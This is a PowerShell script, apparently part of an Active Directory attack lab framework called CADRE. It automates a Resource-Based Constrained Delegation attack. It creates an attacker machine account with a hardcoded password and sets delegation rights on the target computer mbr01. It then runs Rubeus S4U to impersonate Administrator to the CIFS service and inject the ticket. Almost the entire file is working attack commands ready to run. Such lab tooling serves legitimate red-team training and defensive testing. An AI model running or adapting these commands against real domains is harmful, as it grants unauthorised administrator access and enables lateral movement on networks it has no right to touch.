# CADRE — WT#007 Resource-Based Constrained Delegation
. ..\lib\cadre-env.ps1
. ..\lib\common.ps1
print_banner "WT#007 - RBCD"
start_attack "007" "Resource-Based Constrained Delegation"
require_tool Rubeus.exe

# Requires write (GenericWrite/GenericAll) over the target computer mbr01$.
step "Create an attacker computer account (needs ms-DS-MachineAccountQuota > 0)"
run_cmd "New-MachineAccount -MachineAccount ATTACKER -Password (ConvertTo-SecureString 'Att@ck3rP@ss!' -AsPlainText -Force)"

step "Write msDS-AllowedToActOnBehalfOfOtherIdentity on mbr01$ -> ATTACKER$"
run_cmd "Set-ADComputer mbr01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer ATTACKER)"

step "S4U as ATTACKER$ impersonating Administrator to cifs/mbr01"
run_cmd "Rubeus.exe hash /password:Att@ck3rP@ss! /user:ATTACKER`$ /domain:$DOMAIN_CHILD"
run_cmd "Rubeus.exe s4u /user:ATTACKER`$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/mbr01.$DOMAIN_CHILD /ptt"

result $LASTEXITCODE "RBCD completed"
